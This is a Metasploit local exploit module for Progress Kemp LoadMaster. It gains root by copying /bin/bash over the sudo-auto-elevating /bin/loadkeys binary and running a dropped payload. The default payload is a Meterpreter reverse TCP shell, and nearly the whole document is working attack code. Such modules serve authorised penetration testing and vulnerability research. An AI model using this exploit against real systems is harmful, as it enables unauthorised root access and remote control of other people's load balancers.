##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kemp LoadMaster Local sudo privilege escalation',
        'Description' => %q{
          This module abuses a feature of the sudo command on Progress Kemp
          Loadmaster.  Certain binary files are allowed to automatically elevate
          with the sudo command.  This is based off of the file name.  Some files
          have this permission are not write-protected from the default 'bal' user.
          As such, if the file is overwritten with an arbitrary file, it will still
          auto-elevate.  This module overwrites the /bin/loadkeys file with another
          executable.
        },
        'Author' => [
          'Dave Yesland with Rhino Security Labs',
          'bwatters-r7' # module,
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/'],
          ['URL', 'https://kemptechnologies.com/kemp-load-balancers']
        ],
        'DisclosureDate' => '2024-03-19',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'SessionTypes' => ['shell', 'meterpreter'],
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [['Automatic', {}]],
        'Privileged' => true,
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'
        }
      )
    )
    register_options([
      OptString.new('TARGET_BINARY', [true, 'The path for a binary file that has permission to auto-elevate.', '/bin/loadkeys']),
      OptString.new('BINARY_RENAME', [true, 'The temporary name to use to store the TARGET_BINARY.', '/tmp/' + Rex::Text.rand_text_alpha(5..9) ]),
      OptString.new('TEMP_PAYLOAD', [true, 'The temporary name to use to store the TARGET_BINARY.', '/tmp/' + Rex::Text.rand_text_alpha(5..9) ]),
    ])
  end

  def check
    CheckCode::Detected
  end

  def exploit
    vprint_status("Delete #{datastore['BINARY_RENAME']}")
    if exists?(datastore['BINARY_RENAME'])
      vprint_status("Delete temp file #{datastore['BINARY_RENAME']}")
      rm_f(datastore['BINARY_RENAME'])
    end
    if exists?(datastore['TEMP_PAYLOAD'])
      vprint_status("Delete payload file #{datastore['TEMP_PAYLOAD']}")
      rm_f(datastore['TEMP_PAYLOAD'])
    end

    begin
      vprint_status("Saving payload as #{datastore['TEMP_PAYLOAD']}")
      write_file(datastore['TEMP_PAYLOAD'], generate_payload_exe)
      chmod(datastore['TEMP_PAYLOAD'])
      register_file_for_cleanup(datastore['TEMP_PAYLOAD'])

      vprint_status("Moving #{datastore['TARGET_BINARY']} to #{datastore['BINARY_RENAME']}")
      vprint_status(cmd_exec("sudo /bin/cp #{datastore['TARGET_BINARY']} #{datastore['BINARY_RENAME']}"))

      vprint_status("Moving /bin/bash to #{datastore['TARGET_BINARY']}")
      vprint_status(cmd_exec("sudo /bin/cp /bin/bash #{datastore['TARGET_BINARY']}"))

      vprint_status('Launching payload')
      cmd_exec("sudo #{datastore['TARGET_BINARY']} -c #{datastore['TEMP_PAYLOAD']}")
    rescue StandardError => e
      print_error("Exploit Failed: #{e}")
    ensure
      if exists?(datastore['BINARY_RENAME'])
        cmd_exec("sudo /bin/cp #{datastore['BINARY_RENAME']} #{datastore['TARGET_BINARY']}")
        cmd_exec("sudo /bin/rm #{datastore['BINARY_RENAME']}")
      end
    end
  end
end
